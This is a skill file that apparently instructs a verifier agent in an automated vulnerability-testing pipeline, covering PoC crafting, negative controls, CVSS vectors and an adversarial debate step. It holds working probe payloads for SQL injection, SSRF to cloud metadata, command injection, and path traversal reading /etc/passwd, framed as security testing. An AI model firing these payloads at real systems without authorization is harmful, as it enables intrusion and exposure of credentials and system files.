---
name: verifier-overview
description: Stage 3 triage and verification playbook. Crafts minimal PoCs, runs them with ZFP controls, promotes validated bugs to FINDING nodes with CVSS. Load at verifier-agent startup.
---

# Verifier Skill

You are the Zero-False-Positive quality gate. A `FINDING` node with a
`VALIDATES` edge is the contract downstream stages (patcher, exploiter)
consume. False positives at this stage poison everything that follows.

## Verification contract

Every validation MUST provide:

1. `poc_command` — bash reproducer that exercises the bug
2. `success_patterns` — regex(es) that match the exploit signal
3. `negative_command` — same request WITHOUT the payload
4. `negative_patterns` — regex(es) matching the benign baseline
5. `cvss_vector` — full CVSS 3.1 vector string

`validate_finding` will demote the result if the negative control also
matches a success pattern (noise signal).

## Proof-of-concept patterns

### SQLi

```bash
curl -sS "http://target/search?q=x'%20UNION%20SELECT%20'deadbeef'%20--"
# success: "deadbeef"
# negative: curl -sS "http://target/search?q=normal"
# negative: "search results"
```

### SSRF

```bash
curl -sS "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
# success: "ami-id"
# negative: fetch?url=http://example.com/
# negative: "Example Domain"
```

### Command injection

```bash
curl -sS "http://target/ping?host=127.0.0.1;id"
# success: "uid=\\d"
# negative: ?host=127.0.0.1
# negative: "0% packet loss"
```

### Path traversal

```bash
curl -sS "http://target/avatar?file=../../../../etc/passwd"
# success: "root:x:"
# negative: ?file=me.png
# negative: "PNG\r"
```

### Insecure deserialization

Write a tmp sentinel file from the gadget payload, success pattern =
sentinel file exists after request (use `ls /tmp/decepticon-sentinel`).

## CVSS vector cheat-sheet

| Bug class                        | Typical vector                                         |
|----------------------------------|---------------------------------------------------------|
| Unauth RCE                       | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H            |
| Authed SQLi, full DB read        | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N            |
| Unauth SSRF to cloud metadata    | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N            |
| Reflected XSS                    | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N            |
| Path traversal, read-only        | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N            |

## Step 7.5 — Adversarial debate (CRITICAL/HIGH only)

A false-positive CRITICAL/HIGH finding poisons the Patcher and Exploiter,
so those findings must survive an adversarial cross-examination before
promotion.

When `validate_finding` returns `promotion: blocked`:

1. Call `debate_finding(vuln_id, finding_summary, poc_evidence)`. A skeptic
   model from a *different provider family* argues the finding is a false
   positive; the verifier's own model rebuts; a deterministic adjudicator
   scores credibility.
2. Read the `verdict`:
   - `upheld` — the skeptic could not refute it. Re-run `validate_finding`;
     it promotes with a credibility score.
   - `uncertain` — doubt remains but no sound refutation. Re-run
     `validate_finding`; it promotes.
   - `skipped` — only one provider family is configured, so no independent
     debate was possible. Re-run `validate_finding`; it promotes.
   - `refuted` — the skeptic produced a sound refutation. DO NOT promote.
     Revisit the PoC or strengthen the negative control, or record
     `last_failure` and move on.

See the bundled `adversarial-debate` skill for the full rationale.

## What to do when validation fails

1. Check if the service is actually up (`curl` the base URL).
2. Check if the payload encoding survived (URL-encode, base64, etc.).
3. Retry ONCE with a revised PoC.
4. If still failing, record `validation_attempts += 1` and
   `last_failure="<reason>"` on the vuln node and move on.
5. Do NOT keep retrying. The orchestrator will re-queue.
